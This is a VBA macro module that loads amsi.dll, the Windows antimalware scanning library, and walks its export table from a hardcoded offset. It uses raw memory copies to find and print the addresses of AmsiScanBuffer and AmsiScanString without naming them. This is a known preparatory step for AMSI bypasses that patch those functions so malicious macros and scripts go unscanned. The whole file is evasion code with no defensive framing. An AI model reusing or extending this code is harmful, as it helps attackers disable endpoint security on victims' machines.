Attribute VB_Name = "Module1"

Private Declare PtrSafe Sub Peek Lib "msvcrt" Alias "memcpy" (ByRef pDest As Any, ByRef pSource As Any, ByVal nBytes As Long)

Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr


Sub ReturnAddresses()
    
    Dim Ldr_Data_Table_Entry_BaseDllName_BufferAdr As LongPtr
    
    Dim IMAGE_EXPORT_DIRECTORY As LongPtr
    Dim IMAGE_EXPORT_DIRECTORY_Adr_of_Functions As LongPtr
    Dim IMAGE_EXPORT_DIRECTORY_FunctionStart As LongPtr
    Dim IMAGE_EXPORT_DIRECTORY_FunctionStartAdr As LongPtr
    
    Dim AS_String_Adr As LongPtr
    Dim AS_Buffer_Adr As LongPtr
    
    Dim Temp As Long
            
    Ldr_Data_Table_Entry_BaseDllAdr = LoadLibrary("amsi.dll")
        
    IMAGE_EXPORT_DIRECTORY = Ldr_Data_Table_Entry_BaseDllAdr + "58560" 'E4C0
    'Debug.Print "IMAGE_EXPORT_DIRECTORY: " & Hex(IMAGE_EXPORT_DIRECTORY)

    IMAGE_EXPORT_DIRECTORY_Adr_of_Functions = (IMAGE_EXPORT_DIRECTORY + &H1C)
    'Debug.Print "IMAGE_EXPORT_DIRECTORY_Adr_of_Functions: " & Hex(IMAGE_EXPORT_DIRECTORY_Adr_of_Functions)
            
    Peek IMAGE_EXPORT_DIRECTORY_FunctionStart, ByVal (IMAGE_EXPORT_DIRECTORY_Adr_of_Functions), 4
    'Debug.Print Hex(IMAGE_EXPORT_DIRECTORY_FunctionStart)
            
    IMAGE_EXPORT_DIRECTORY_FunctionStartAdr = Ldr_Data_Table_Entry_BaseDllAdr + IMAGE_EXPORT_DIRECTORY_FunctionStart
    'Debug.Print "Function Addresses Start at:" & Hex(IMAGE_EXPORT_DIRECTORY_FunctionStartAdr)
            
    Peek Temp, ByVal (IMAGE_EXPORT_DIRECTORY_FunctionStartAdr + 12), 4
    AS_Buffer_Adr = Ldr_Data_Table_Entry_BaseDllAdr + Temp
    Debug.Print "Amsi Scan Buffer Found at:" & Hex(AS_Buffer_Adr)
     
    Peek Temp, ByVal (IMAGE_EXPORT_DIRECTORY_FunctionStartAdr + 16), 4
    AS_String_Adr = Ldr_Data_Table_Entry_BaseDllAdr + Temp
    Debug.Print "Amsi Scan String Found at:" & Hex(AS_String_Adr)

End Sub


